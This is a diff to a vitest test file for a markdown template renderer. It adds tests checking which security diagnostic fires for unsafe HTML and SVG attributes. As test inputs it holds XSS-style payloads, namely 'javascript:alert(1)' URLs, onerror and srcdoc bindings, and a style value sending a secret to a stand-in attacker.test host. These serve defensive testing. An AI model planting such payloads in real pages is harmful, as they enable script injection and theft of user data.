@@ -1,7 +1,13 @@
-import { describe, expect, it } from "vitest"
+import * as comarkRender from "comark/render"
+import { describe, expect, it, vi } from "vitest"
 
 import { renderMarkdownTemplateInternal } from "../src/internal/composition.ts"
 import { renderMarkdownTemplate } from "../src/index.ts"
+
+vi.mock("comark/render", async (importOriginal) => {
+  const actual = await importOriginal<typeof comarkRender>()
+  return { ...actual, renderMarkdown: vi.fn(actual.renderMarkdown) }
+})
 
 describe("renderMarkdownTemplate", () => {
   it.each([false, true])("preserves matched undefined dotted paths in insertion order %s", async (reverse) => {
@@ -475,6 +481,66 @@ Unavailable
       data: { css: "background:url(https://attacker.test/collect?secret=1)" },
     })).rejects.toThrow("cannot target a style attribute")
     await expect(renderMarkdownTemplate('<div style="color: red">Content</div>')).resolves.toContain('style="color: red"')
+  })
+
+  it.each([
+    [':onerror="data.missing" :srcdoc="data.value"', "MARKDOWN_TEMPLATE_R0031", "MARKDOWN_TEMPLATE_R0017"],
+    [':onerror="data.value" :srcdoc="data.value"', "MARKDOWN_TEMPLATE_R0031", "MARKDOWN_TEMPLATE_R0030"],
+    [':style="data.missing" :srcdoc="data.value"', "MARKDOWN_TEMPLATE_R0017", "MARKDOWN_TEMPLATE_R0017"],
+    [':style="data.value" :srcdoc="data.value"', "MARKDOWN_TEMPLATE_R0030", "MARKDOWN_TEMPLATE_R0030"],
+    [':style="data.value" src="javascript:alert(1)"', "MARKDOWN_TEMPLATE_R0032", "MARKDOWN_TEMPLATE_R0032"],
+    ['src="javascript:alert(1)"', "MARKDOWN_TEMPLATE_R0013", "MARKDOWN_TEMPLATE_R0013"],
+  ])("preserves image and generic HTML diagnostic precedence for %s", async (attrs, imageCode, htmlCode) => {
+    for (const [tag, code] of [["img", imageCode], ["iframe", htmlCode]]) {
+      await expect(renderMarkdownTemplate(`<${tag} ${attrs}>\n{{ data.missingChild }}\n</${tag}>`, {
+        data: { value: "value" },
+        plugins: [{
+          name: "reject-block-child-parsing",
+          pre: ({ markdown }) => {
+            if (markdown.trim() === "{{ data.missingChild }}") throw new Error("Invalid block child")
+          },
+        }],
+      })).rejects.toMatchObject({ code })
+    }
+  })
+
+  it.each([
+    { tag: "svg", svg: undefined },
+    { tag: "foreignObject", svg: true },
+    { tag: "img", svg: undefined },
+    { tag: "img", svg: true },
+  ])("restores SVG context after an awaited $tag child rejects in SVG context $svg", async ({ tag, svg }) => {
+    const { renderMarkdown: render } = await vi.importActual<typeof comarkRender>("comark/render")
+    vi.mocked(comarkRender.renderMarkdown).mockImplementationOnce((document, options) => render({
+      ...document,
+      nodes: [["recover", {}, ...document.nodes]],
+    }, {
+      ...options,
+      components: {
+        ...options?.components,
+        Recover: async (node, state) => {
+          state.applyContext({ svg })
+          await expect(state.flow(node, state)).rejects.toMatchObject({ code: "MARKDOWN_TEMPLATE_R0020" })
+          expect(state.context.svg).toBe(svg)
+          const sibling = state.one(["img", { href: "javascript:alert(1)", $: { html: 1 } }], state)
+          if (svg) {
+            await expect(sibling).rejects.toMatchObject({ code: "MARKDOWN_TEMPLATE_R0013" })
+            return "Recovered in SVG"
+          }
+          return await sibling
+        },
+      },
+    }))
+    const result = await renderMarkdownTemplate("Authored node supplied by a parser plugin", {
+      data: { fragment: false },
+      plugins: [{
+        name: "authored-node-with-rejecting-child",
+        post: ({ tree }) => {
+          tree.nodes = [[tag, { $: { html: 1 } }, ["insert", { ":markdown": "data.fragment" }]]]
+        },
+      }],
+    })
+    expect(result).toBe(svg ? "Recovered in SVG" : '<img href="javascript:alert(1)">')
   })
 
   it("rejects data bindings for HTML event-handler attributes", async () => {
